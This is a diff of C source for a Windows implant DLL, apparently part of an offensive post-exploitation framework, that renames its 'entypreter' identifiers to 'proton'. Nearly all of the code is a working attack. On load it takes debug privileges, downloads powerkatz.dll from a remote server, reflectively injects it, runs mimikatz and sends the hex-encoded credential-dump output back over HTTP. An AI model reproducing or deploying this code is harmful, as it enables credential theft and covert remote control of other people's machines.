@@ -3,15 +3,15 @@
 
 #include "ReflectiveLoader.h"
 
-#include "../entypreter_types.h"
-#include "../entypreter_util.h"
-#include "../entypreter_process.h"
-#include "../entypreter_net.h"
-#include "../entypreter_load.h"
+#include "../proton_types.h"
+#include "../proton_util.h"
+#include "../proton_process.h"
+#include "../proton_net.h"
+#include "../proton_load.h"
 
 extern HINSTANCE hAppInstance;
 
-void report_mimikatz_output(entypreter_shim_parsed * parsed, wchar_t * output) 
+void report_mimikatz_output(proton_shim_parsed * parsed, wchar_t * output) 
 {
 	size_t len = wcslen(output);
 	char * output_as_bytes = (char *)output;
@@ -24,54 +24,54 @@ void report_mimikatz_output(entypreter_shim_parsed * parsed, wchar_t * output)
 		sprintf(&output_buffer[i * 2], "%02X", output_as_bytes[i]);
 	}
 	
-	entypreter_http_report_work(parsed, output_buffer);
+	proton_http_report_work(parsed, output_buffer);
 }
 
-void entypreter_mimikatz_shim(LPWSTR shim)
+void proton_mimikatz_shim(LPWSTR shim)
 {
 	char *data;
 	DWORD dwSize;
-	entypreter_shim_parsed parsed;
+	proton_shim_parsed parsed;
 
 	__try
 	{
 		// we have to pass stupid Unicode string in, cuz making structs in JScript is nothx
 		// if this errors we can't even report_error
-		if (!entypreter_parse_shim(shim, &parsed))
+		if (!proton_parse_shim(shim, &parsed))
 			return;
 
 		// if this fails, wtf? elevate nub
-		if (!entypreter_get_debug_priv())
+		if (!proton_get_debug_priv())
 		{
-			entypreter_http_report_error(&parsed, "Failed to get SeDebugPriv.");
+			proton_http_report_error(&parsed, "Failed to get SeDebugPriv.");
 			// don't return, keep trying lil buddy
 		}
 
 		// if we are Wow64 process (x86 .exe on x64 CPU), we need to fork
-		if (!entypreter_cpu_matches_process())
+		if (!proton_cpu_matches_process())
 		{
 			// get the x64 DLL via web request
-			if (!entypreter_http_get_x64_shim(&parsed, &data, &dwSize))
+			if (!proton_http_get_x64_shim(&parsed, &data, &dwSize))
 				return;
 
 			// start an x64 process and reflectively load x64 DLL in it
-			if (!entypreter_fork_x64(&parsed, shim, data, dwSize))
-				entypreter_http_report_error(&parsed, "Failed to fork to x64.");
+			if (!proton_fork_x64(&parsed, shim, data, dwSize))
+				proton_http_report_error(&parsed, "Failed to fork to x64.");
 			else
-				entypreter_http_report_work(&parsed, "Successfully forked to x64.");
+				proton_http_report_work(&parsed, "Successfully forked to x64.");
 
 			return;
 		}
 
 		// if we got here, we can download powerkatz and inject it
-		if (!entypreter_http_get_powerkatz(&parsed, &data, &dwSize))
+		if (!proton_http_get_powerkatz(&parsed, &data, &dwSize))
 			return;
 		
 		HMODULE hPowerkatz = powerkatz_reflective_load((LPVOID)data, NULL);
 
 		if (!hPowerkatz)
 		{
-			entypreter_http_report_error(&parsed, "Failed to load powerkatz.dll.");
+			proton_http_report_error(&parsed, "Failed to load powerkatz.dll.");
 			return;
 		}
 
@@ -92,7 +92,7 @@ void entypreter_mimikatz_shim(LPWSTR shim)
 		output = powerkatz_invoke(hPowerkatz, mimicmd);
 		report_mimikatz_output(&parsed, output);
 
-		entypreter_http_report_work(&parsed, "Complete");
+		proton_http_report_work(&parsed, "Complete");
 
 		ExitProcess(0);
 	}
@@ -100,7 +100,7 @@ void entypreter_mimikatz_shim(LPWSTR shim)
 	{
 		__try
 		{
-			entypreter_http_report_error(&parsed, "Catastrophic error occurred!");
+			proton_http_report_error(&parsed, "Catastrophic error occurred!");
 		}
 		__except(EXCEPTION_EXECUTE_HANDLER)
 		{
@@ -121,7 +121,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 			break;
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hinstDLL;
-			entypreter_mimikatz_shim((LPWSTR)lpReserved);
+			proton_mimikatz_shim((LPWSTR)lpReserved);
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
